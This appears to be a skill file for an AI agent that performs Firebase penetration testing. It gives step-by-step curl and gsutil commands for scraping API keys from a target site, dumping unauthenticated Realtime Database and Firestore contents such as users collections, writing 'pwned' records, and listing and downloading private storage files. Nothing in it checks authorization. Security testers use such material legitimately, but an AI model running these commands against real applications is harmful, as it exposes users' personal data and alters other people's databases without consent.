---
name: tech-firebase
description: "Firebase security testing — Firestore/RTDB unauthenticated read/write, Firebase Auth bypass, Storage bucket enumeration, API key exposure, Cloud Functions SSRF. Triggers: 'firebase', 'firestore', 'firebase security', 'firebase pentest', 'firebase rtdb', 'firebase auth bypass', 'firebase storage', 'firebase api key', 'firebase misconfiguration'."
---

# Firebase Security Testing

Test Firebase for public database access and misconfigured rules.

---

## Phase 1: API Key & Config Discovery

```bash
TARGET="https://TARGET"

# Extract Firebase config from JS:
curl -s "$TARGET/" | grep -oE '"apiKey":"[^"]+"' | tee output/firebase_apikey.txt
curl -s "$TARGET/static/js/main.chunk.js" | grep -oE '"projectId":"[^"]+"' | tee output/firebase_project.txt

# Common locations:
curl -s "$TARGET/firebase-config.js" 2>/dev/null
curl -s "$TARGET/__/firebase/init.json" 2>/dev/null | jq . | tee output/firebase_init.txt
curl -s "$TARGET/__/firebase/init.js" 2>/dev/null | tee output/firebase_init_js.txt

# Extract from JS files:
gau "$TARGET" | grep "\.js" | while IFS= read -r JSURL; do
  curl -s "$JSURL" | grep -oE '"projectId":"[^"]+"|"apiKey":"[^"]+"|"storageBucket":"[^"]+"'
done | sort -u | tee output/firebase_config.txt
```

---

## Phase 2: Realtime Database (RTDB) Access

```bash
PROJECT_ID="your-project"

# Test unauthenticated read:
curl -s "https://$PROJECT_ID-default-rtdb.firebaseio.com/.json" | jq . | head -50 | tee output/rtdb_root.txt

# Dump all data:
curl -s "https://$PROJECT_ID-default-rtdb.firebaseio.com/.json?shallow=true" | jq 'keys' | tee output/rtdb_keys.txt

# Access specific collection:
curl -s "https://$PROJECT_ID-default-rtdb.firebaseio.com/users.json" | jq . | tee output/rtdb_users.txt

# Write test (if rules allow):
curl -s -X PUT "https://$PROJECT_ID-default-rtdb.firebaseio.com/test.json" \
  -H "Content-Type: application/json" \
  -d '"pwned"' | tee output/rtdb_write_test.txt
```

---

## Phase 3: Firestore Enumeration

```bash
PROJECT_ID="your-project"
API_KEY="FIREBASE_API_KEY"

# List collections via REST API:
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents?key=$API_KEY" | \
  jq '.documents[].name' | tee output/firestore_collections.txt

# Read collection:
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users?key=$API_KEY" | \
  jq '.documents[]' | tee output/firestore_users.txt

# Write document (test write permissions):
curl -s -X POST \
  "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/pwned?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"fields": {"message": {"stringValue": "access_test"}}}' | jq .name
```

---

## Phase 4: Storage Bucket Enumeration

```bash
PROJECT_ID="your-project"
STORAGE_BUCKET="$PROJECT_ID.appspot.com"

# List bucket contents:
curl -s "https://firebasestorage.googleapis.com/v0/b/$STORAGE_BUCKET/o" | \
  jq '.items[].name' | tee output/storage_files.txt

# Download file:
TOKEN=$(curl -s "https://firebasestorage.googleapis.com/v0/b/$STORAGE_BUCKET/o/private%2Fdata.json" | jq -r '.downloadTokens')
curl -s "https://firebasestorage.googleapis.com/v0/b/$STORAGE_BUCKET/o/private%2Fdata.json?alt=media&token=$TOKEN" | jq .

# GSUTIL (if gcloud configured):
gsutil ls "gs://$STORAGE_BUCKET/" 2>/dev/null | tee output/gsutil_storage.txt
```

---

## Output

Save to `output/`:
- `firebase_config.txt` — extracted Firebase config
- `rtdb_root.txt` — realtime database root dump
- `firestore_users.txt` — Firestore users collection

## Next Phase

→ `vuln-sensitive-exposure` for exposed PII
→ `vuln-auth-workflow` if Firebase Auth is misconfigured
